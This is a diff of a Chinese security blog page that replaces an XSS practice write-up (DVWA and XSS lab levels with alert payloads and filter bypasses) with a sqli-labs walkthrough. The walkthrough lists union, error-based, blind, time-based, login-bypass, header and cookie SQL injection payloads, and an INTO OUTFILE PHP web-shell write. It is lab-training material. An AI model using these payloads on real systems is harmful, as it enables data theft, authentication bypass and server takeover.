@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>XSS练习靶场 · 阿杰的小站</title>
+    <title>sqli-labs 通关1 · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >阿杰的小站</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">XSS练习靶场</a>
+                <a href="#" class="post-name">sqli-labs 通关1</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            XSS练习靶场
+            sqli-labs 通关1
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "靶场">靶场</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">775</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.5k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/07/28</span>
+                    <span class="post-intro-time">2019/08/17</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,33 +401,73 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="一、DVWA"><a href="#一、DVWA" class="headerlink" title="一、DVWA"></a>一、DVWA</h2><h3 id="1-DOM"><a href="#1-DOM" class="headerlink" title="1.DOM"></a>1.DOM</h3><p>low：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>medium：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>注意有的要包裹前面的<br>high：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code><br>服务器端过滤的是GET的参数，而前端js使用的是整个url，可以通过#隔开插入js语句</p>
-<h3 id="2-stored和reflect"><a href="#2-stored和reflect" class="headerlink" title="2.stored和reflect"></a>2.stored和reflect</h3><p><code>&lt;img src=1 onerror=alert(1)&gt;</code>通关所有</p>
-<h2 id="二、XSS靶场"><a href="#二、XSS靶场" class="headerlink" title="二、XSS靶场"></a>二、XSS靶场</h2><p>level1：<code>http://xss.tesla-space.com/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在外部</p>
-<p>level2：<code>http://xss.tesla-space.com/level1.php?name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在属性中</p>
-<p>level3：<code>http://xss.tesla-space.com/level3.php?keyword=&#39; onclick=&#39;alert(1)</code><br>尖括号，双引号都被过滤了，单引号没被过滤，尝试通过单引号闭合并尝试</p>
-<p>level4：<code>http://xss.tesla-space.com/level4.php?keyword=&quot; onclick=&quot;alert(1)</code><br>与level3类似，只是单引号变双引号</p>
-<p>level5：<code>http://xss.tesla-space.com/level5.php?keyword=&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code><br>过滤了on和srcipt，可以通过javascript伪协议弹窗，a的href属性或者iframe的src属性都可以</p>
-<p>level6：<code>http://xss.tesla-space.com/level6.php?keyword=&quot; oNclick=&quot;alert(1)</code><br>大小写绕过对ON的过滤</p>
-<p>level7：<code>http://xss.tesla-space.com/level7.php?keyword=&quot; oonnclick=&quot;alert(1)</code><br>叠加绕过对on的过滤</p>
-<p>level8：<code>http://xss.tesla-space.com/level8.php?keyword=javascrip%26%23x74%3B%3Aalert%28%2fxss%2f%29</code><br>test值出现在a的src属性中，可以通过伪js代码进行xss，过滤了javascript字符串<br>因为是在属性当中，所以可以通过实体编码绕过，如<code>javascrip&amp;#116;:alert(/xss/)</code>在url传输中需要进行url编码<br><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">编码网站</a></p>
-<p>level9：<code>http://xss.tesla-space.com/level9.php?keyword=javascrip%26%23116%3Aalert%281%29%2f%2fhttp%3A%2f%2fwww.baidu.com</code><br>与level8类似，多了正则匹配http正确网址，在后面加个<code>//</code>和网址就可以绕过</p>
-<p>level10：<code>http://xss.tesla-space.com/level10.php?keyword=sb&amp;t_link=http://www.baidu.comt&amp;t_history=666&amp;t_sort=&quot; onmouseover=&quot;alert(1)&quot; type=&quot;button</code><br>hidden属性中的xss注入，hidden中的值也要测试，可能过滤不严也会出现xss</p>
-<p>level11：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>referrer属性的值在html中出现，并且过滤不严</p>
-<p>level12：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将数据包中的user-agent放在input属性中。</p>
-<p>level13：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将cookie中的值放在input属性中</p>
-<p>level14：chrome组件exif xss，有点问题没做出来<br>level15：<code>http://xss.tesla-space.com/level15.php?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code><br>angular js的一点知识，ng-include有包含文件的意思，相当于php的include<br>奇怪的是，我直接访问没法包含，前进后退才成功包含，我也不清楚原因，可以包含同域的第一关页面的xss成功反弹</p>
-<p>level16：<code>http://xss.tesla-space.com/level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code><br>过滤了空格和script，可以用img标签，然后用%0a绕过空格</p>
-<p>level17：<code>http://xss.tesla-space.com/level17.php?arg01=.php/sbasdf/wqer/asdf&amp;arg02= onclick=alert(1) style=display:block;height:500px;width:500px;background:blue;</code><br>也是属性内的xss，但是标签显示不出来，插入style属性，将标签转换为block就能点击</p>
+        <h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><strong>union 注入</strong><br>1.插入转义字符查看报错<br><code>1\</code><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1<br>通过报错可以看到id是用什么包裹的</p>
+<p>1.and判断是否存在注入<br><code>1&#39; and 1=1 %23</code><br><code>1&#39; and 1=2 %23</code><br><code>`1&#39; %26%26 1=2 %23</code></p>
+<p>2.order by判断字段数<br>因为union注入，必须和前面查询的字段数相同<br><code>1&#39; order by 3 %23</code><br>从大到小依次测试，直到显示成功</p>
+<p>3.判断回显位置<br><code>-1&#39; union select 1,2,3 %23</code><br>查询的id号的记录必须为空，才能回显我们自己构造的数据</p>
+<p>4.查数据库<br><code>-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code><br>从information_schema数据库中的shcemata表中的schema_name字段查询出所有的数据库名</p>
+<p>5.查表<br><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code><br>从information_schema数据库中的tables表中的table_name字段查询出所有的表名</p>
+<p>6.查字段<br><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code><br>从information_schema数据库中的columns表中的column_name字段查询出所有的字段名</p>
+<p>7.查数据<br><code>id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users%23</code><br>查询出所有数据<br><code>?id=-1&#39; union select 1,username,password from security.users limit 0,1%23</code><br>单个数据查询</p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>与第一关类似，区别在于id不用加单引号<br><code>?id=-1 union select 1,username,password from security.users limit 2,1%23</code></p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>与第一关类似，区别在于id用(‘’)包裹<br><code>-1&#39;) union select 1,username,password from security.users limit 0,1%23</code></p>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>与第一关类似，区别在于id用(“”)包裹<br><code>?id=-1&quot;) union select 1,username,password from security.users limit 0,1%23</code></p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p><strong>可以报错的盲注</strong><br><strong>报错注入：</strong><br>1.报错可以查看包裹字符为<code>&#39;</code><br><code>1\</code></p>
+<p>2.and判断包裹字符确实为<code>&#39;</code><br><code>1&#39; and 1=1 %23</code></p>
+<p>3.order by判断字段<br><code>1&#39; order by 3 %23</code></p>
+<p>4.报错注入<br>注意报错注入依然用union，所以前后字段数需要相同<br>payload1:<br><code>1&#39; union select 1 from (select 1,count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %23</code></p>
+<p>payload2:<br><code>1&#39; union select 1 from (select 1,count(*),3 from information_schema.tables group by concat(database(),floor(rand(0)*2)))b %23</code><br>该payload只是payload1的简化</p>
+<p>payload3:<br><code>1&#39; union select 1 from (select 1,count(*),3 from (select 1 union select null union select !1) as a group by concat(database(),floor(rand(0)*2)))b %23</code><br>当关键表被禁用可以用这个形式，如information.tables</p>
+<p>payload4:<br><code>1&#39; union select 1 from ()bselect 1,min(@a:=1),3 from information_schema.tables group by concat(database(),@a:=(@a%2b1)%2) %23</code><br><code>+</code>号需要url编码，当count(*)和rand()被禁用，可以用该payload</p>
+<p>payload5:<br><code>1&#39; union select 1,extractvalue(1,concat(0x7e,(select database()),0x7e)),2 %23</code><br>extractvalue触发xpath报错注入</p>
+<p>payload6:<br><code>1&#39; union select 1,updatexml(1,concat(0x7e,(select database()),0x7e),1),2 %23</code><br>updatexml触发xpath报错注入</p>
+<p>payload7:<br><code>1&#39; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x %23</code><br>该payload暂时只知道用来查版本</p>
+<p><strong>布尔盲注：</strong><br>1.报错可以查看包裹字符为<code>&#39;</code><br><code>1\</code></p>
+<p>2.and判断包裹字符确实为<code>&#39;</code><br><code>1&#39; and 1=1 %23</code></p>
+<p>3.order by判断字段<br><code>1&#39; order by 3 %23</code></p>
+<p>4.ascii和substr配合查询</p>
+<blockquote>
+<p>ascii：转换为ascii码<br>substr：substr(查询值,1,1)查询第一个字符</p>
+</blockquote>
+<p><code>1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;0 %23</code><br>id值必须为有效字段，通过判断and后面的bool值来猜出数据的多少，true就显示数据，false就不显示数据</p>
+<p>5.编写python脚本爆数据<br>(select schema_name from information_schema.schemata limit 0,1)</p>
+<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>与第五关类似，区别在于id用<code>&quot;&quot;</code>包裹<br><code>1&quot; and ascii(substr(database(),1,1))&gt;0 %23</code></p>
+<h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p><strong>无报错回显的布尔盲注</strong><br>1.插入单引号和双引号<br>单引号报错，双引号不报错，可以判断有单引号包裹<br>2.构造判断语句<br><code>1&#39; and 1=1 %23</code><br>依然报错<br><code>1&#39;)) and 1=1 %23</code><br>不报错<br>可以判断id由<code>((&#39;&#39;))</code>包裹<br>3.写脚本爆数据<br>4.使用<code>into outfile</code><br>先测试<br><code>1&#39;)) and (select count(*) from mysql.user)&gt;0 %23</code><br>显然有权限，然后写入文件<br><code>-1&#39;)) union select 1,&#39;&lt;?php @eval($_post[mima])?&gt;&#39;,3 into outfile &quot;D:\\1.php&quot; %23</code><br>前提，需要知道web文件目录，然后使用菜刀连接，就可以获得shell</p>
+<h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>与第七关类似，区别在于id用<code>&#39;&#39;</code>包裹</p>
+<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p><strong>时间注入</strong></p>
+<ol>
+<li>通过sleep判断id由什么包裹<br><code>1&#39; and sleep(3) %23</code><br>延迟3秒才加载完成，可以判断id由<code>&#39;&#39;</code>包裹</li>
+</ol>
+<p>2.通过if函数进行判断</p>
+<blockquote>
+<p>if(bool,执行True,执行False)</p>
+</blockquote>
+<p>所以构造payload<br><code>1&#39; and if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;0,sleep(3),1) %23</code><br>延迟3秒，注入成功。</p>
+<p>3.编写脚本爆数据</p>
+<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>与第九关类似，区别在于id用<code>&quot;&quot;</code>包裹</p>
+<h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p><strong>POST类型的union注入</strong><br><strong>登录</strong><br>1.猜测语句<br><code>select * from users where username=&#39;?&#39; and password=&#39;?&#39; %23</code><br>2.在username插入<code>\</code>报错<br>可以判断username和password用<code>&#39;&#39;</code>包裹<br>3.判断是否正确<br><code>uname=1&#39; or 1=1 %23&amp;passwd=</code><br><code>uname=1&#39; or 1=2 %23&amp;passwd=</code><br>通过回显可以判断包裹<br>4.一句话登录<br>如果知道用户名，不用密码可以任意登录<br><code>uname=Dumb&#39; %23&amp;passwd=</code><br>不用用户名和密码，登录任意指定号数的用户<br><code>uname=1&#39; or 1=1 limit 0,1%23&amp;passwd=</code></p>
+<p><strong>爆数据</strong><br>1.判断字段<br><code>uname=1&#39; order by 2%23&amp;passwd=</code><br>2.判断回显位置<br><code>uname=1&#39; union select 1,2%23&amp;passwd=</code><br>3.爆数据<br>payload:<code>uname=1&#39; union select database(),2%23&amp;passwd=</code></p>
+<h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>与第十一关类似，区别在于id用<code>(&quot;&quot;)</code>包裹<br><code>uname=1&quot;) union select database(),2%23&amp;passwd=</code></p>
+<h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p><strong>数据不回显，但是报错的POST注入</strong><br>登录与第十一关类似<br><strong>爆数据</strong><br>报错爆数据<br><code>uname=1&#39;) union select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23&amp;passwd=</code><br>通过该语句写脚本爆数据<br><code>uname=1&#39;) or bool 23&amp;passwd=</code></p>
+<h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>与第十三关类似，区别在于id用<code>&quot;&quot;</code>包裹<br><code>uname=1&quot; union select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23&amp;passwd=</code></p>
+<h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p><strong>最像登录的一关，无报错，无回显</strong><br>1.判断id用什么包裹<br><code>uname=1&#39; or 1=1 %23&amp;passwd=</code><br>可以发现id用<code>&#39;&#39;</code>包裹<br>2.通过bool写脚本爆数据</p>
+<h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>与第十五关类似，区别在于id用<code>(&quot;&quot;)</code>包裹<br><code>uname=1&quot;) or 1=1 %23&amp;passwd=</code></p>
+<h2 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h2><p><strong>update注入</strong><br>场景可以想象成，我们是一个用户在自己的修改密码页面，进行update注入获得数据信息<br>猜测语句<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39;</code><br>1.测试包裹情况<br><code>uname=admin&#39;&amp;passwd=1</code><br>检测到黑客攻击，应该对uname注入点防范严格<br><code>uname=admin&amp;passwd=1&#39;</code><br>出现报错，password存在注入，password应该用<code>&#39;&#39;</code>包裹<br>2.可以通过and (报错函数)进行爆数据<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39; and (报错函数)</code><br>因此可以构造payload<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39; and (报错函数)</code><br>对于concat类型报错，需要用<code>select 1 from (报错函数)b</code>进行构造<br>payload:<code>uname=admin&amp;passwd=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b)%23</code><br>3.时间类型注入<br><code>uname=admin&amp;passwd=2&#39; and if(length((select password from security.users limit 0,1))&gt;0,sleep(0.1),1)%23</code><br>可以写脚本爆数据，但是没法爆修改表的数据，所以有一定缺陷，不知道怎么绕过</p>
+<h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p><strong>http头+insert注入</strong><br>场景：已知自己账号的情况下，服务器随意将用户浏览器添加到数据库中<br>1.看到User-Agent回显，猜测语句<br><code>insert into uagents (uagent, ip_address, username`) VALUES (&#39;?&#39;, &#39;ip&#39;, &#39;name&#39;)</code><br>判断包裹<br><code>{&#39;User-Agent&#39;:&quot;1&#39; and sleep(3) and &#39;1&#39;=&#39;1&quot;}</code><br>可以发现存在注入，id包裹为<code>&#39;&#39;</code><br>2.编写脚本爆数据<br>睡眠语句应该插入在VALUES字段当中才有效果，且前面值必须为True<br>3.注<br>一般http头注入通过编写脚本会更直观一些</p>
+<h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>与第十八关类似，区别在于http头为Rerferer<br><code>{&#39;Rerferer&#39;:&quot;1&#39; and sleep(3) and &#39;1&#39;=&#39;1&quot;}</code></p>
+<h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p><strong>使用Cookie进行查询的注入</strong><br>场景，通过cookie来查询数据库获得用户信息<br>1.测试cookie，可以发现存在越权<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&quot;}</code><br>登录为Dumb<br><code>{&#39;Cookie&#39;:&quot;uname=Admin&quot;}</code><br>登录为Admin<br>2.插入<code>\</code><br>出现报错，可以判断出id包裹为<code>&#39;&#39;</code><br>3.无法判断后台语句，可能是插入或者查询<br>我们尝试通用sleep语句来测试<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&#39; and sleep(3) #&quot;}</code><br>可以发现延迟了3秒钟，因而存在注入<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&#39; and 1=1 #&quot;}</code><br>这个payload也可以判断出布尔注入<br><code>uname=1&#39; union select 1,2,3 #</code><br>这个payload也可以判断出union注入<br>4.编写脚本或者使用报错函数都可以</p>
+<h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p><strong>经过base64处理过的cookie查询注入</strong><br>1.测试cookie<br>通过base64解码，得到明文Dumb<br>2.插入’\’<br><code>1\</code><br>经过base64编码，插入cookie中<br>可以发现报错，得到cookie用<code>(&#39;&#39;)</code>来包裹<br>3.payload<br><code>-1&#39;) union select 1,database(),3 #</code></p>
+<h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>与第二十一关类似，区别在于cookie用<code>&quot;&quot;</code>包裹<br><code>-1&quot; union select 1,database(),3 #</code></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通常意义上的普通注入，从输入点分类有GET注入、POST注入、http头注入，从获取数据方式，有union注入、报错注入、布尔盲注、时间注入，从数据库操作方式有select注入、update注入、insert注入。</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">Kage</a>
-            <p>原文链接：<a href="http://yoursite.com/2019/07/28/XSS练习靶场/">http://yoursite.com/2019/07/28/XSS练习靶场/</a>
-            <p>发表日期：<a href="http://yoursite.com/2019/07/28/XSS练习靶场/">七月 28日 2019, 8:48:46 晚上</a>
-            <p>更新日期：<a href="http://yoursite.com/2019/07/28/XSS练习靶场/">July 28th 2019, 8:48:46 pm</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/08/17/sqli-labs 通关1/">http://yoursite.com/2019/08/17/sqli-labs 通关1/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/08/17/sqli-labs 通关1/">八月 17日 2019, 11:15:22 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/08/17/sqli-labs 通关1/">August 17th 2019, 11:15:22 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -436,16 +476,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/08/06/De1CTF SSRF ME/" title= "De1CTF SSRF ME">
-                    <div class="nextTitle">De1CTF SSRF ME</div>
+                <a href= "/2019/08/17/sqli-labs通过2/" title= "sqli-labs通过2">
+                    <div class="nextTitle">sqli-labs通过2</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/07/28/制作windows小脚本/" title= "制作windows小脚本">
-                    <div class="prevTitle">制作windows小脚本</div>
+                <a href= "/2019/08/15/CBC翻转字节攻击/" title= "CBC翻转字节攻击">
+                    <div class="prevTitle">CBC翻转字节攻击</div>
                 </a>
             
         </li>
@@ -561,7 +601,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、DVWA"><span class="toc-number">1.</span> <span class="toc-text">一、DVWA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-DOM"><span class="toc-number">1.1.</span> <span class="toc-text">1.DOM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-stored和reflect"><span class="toc-number">1.2.</span> <span class="toc-text">2.stored和reflect</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、XSS靶场"><span class="toc-number">2.</span> <span class="toc-text">二、XSS靶场</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一关"><span class="toc-number">1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二关"><span class="toc-number">2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三关"><span class="toc-number">3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四关"><span class="toc-number">4.</span> <span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第五关"><span class="toc-number">5.</span> <span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第六关"><span class="toc-number">6.</span> <span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第七关"><span class="toc-number">7.</span> <span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第八关"><span class="toc-number">8.</span> <span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第九关"><span class="toc-number">9.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十关"><span class="toc-number">10.</span> <span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十一关"><span class="toc-number">11.</span> <span class="toc-text">第十一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十二关"><span class="toc-number">12.</span> <span class="toc-text">第十二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十三关"><span class="toc-number">13.</span> <span class="toc-text">第十三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十四关"><span class="toc-number">14.</span> <span class="toc-text">第十四关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十五关"><span class="toc-number">15.</span> <span class="toc-text">第十五关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十六关"><span class="toc-number">16.</span> <span class="toc-text">第十六关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十七关"><span class="toc-number">17.</span> <span class="toc-text">第十七关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十八关"><span class="toc-number">18.</span> <span class="toc-text">第十八关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第十九关"><span class="toc-number">19.</span> <span class="toc-text">第十九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二十关"><span class="toc-number">20.</span> <span class="toc-text">第二十关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二十一关"><span class="toc-number">21.</span> <span class="toc-text">第二十一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二十二关"><span class="toc-number">22.</span> <span class="toc-text">第二十二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">23.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
